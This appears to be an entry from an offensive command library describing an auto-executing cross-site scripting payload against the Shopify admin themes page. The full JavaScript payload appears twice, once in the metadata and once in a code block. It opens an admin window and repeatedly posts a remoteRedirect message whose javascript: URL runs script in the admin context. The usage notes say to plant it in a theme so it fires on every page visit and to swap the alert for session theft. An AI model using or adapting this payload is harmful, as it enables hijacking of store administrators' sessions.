---
data: >-
  <script>

  function attack(){

  var ctx=window.open(location.origin+'/admin/themes','_blank');

  var interval;

  interval=setInterval(function(){

  if(window.attackSuccess){

  clearInterval(interval);

  }else{

  ctx.postMessage(`{"message":"Shopify.API.remoteRedirect","data":{"location":"javascript:alert(document.domain)"}}`);

  }

  },500);;

  }

  attack();

  </script>

  <a href="javascript:attack()"
  style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click
  me start attack</a>
tags:
  - xss
  - auto-execution
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:18.180Z'
id: 61821582-36b6-47b7-adcc-b79eed499f8a
verified: false
validated: true
submitted: true
---
# inject-auto-shopify-xss-payload

## Command

```javascript
<script>
function attack(){
var ctx=window.open(location.origin+'/admin/themes','_blank');
var interval;
interval=setInterval(function(){
if(window.attackSuccess){
clearInterval(interval);
}else{
ctx.postMessage(`{"message":"Shopify.API.remoteRedirect","data":{"location":"javascript:alert(document.domain)"}}`);
}
},500);;
}
attack();
</script>
<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
```

## Description

Updated JavaScript command that automatically executes the attack function on page load, using the current origin for the admin window, to bypass manual clicking for seamless exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| ctx | Blank window to current origin + /admin/themes | Yes |
| interval | setInterval for 500ms polling | Yes |
| postMessage payload | JSON targeting remoteRedirect | Yes |

## Examples

### Basic Usage

Insert into theme for auto-trigger on any page visit.

### Advanced Usage

Replace alert with more malicious JS like session theft.

## Expected Output

Automatic popup window with alert execution in admin context upon page access.

## Related

- [[commands/inject-shopify-xss-payload]]
- [[procedures/Trigger-Payload-as-Authenticated-Admin]]
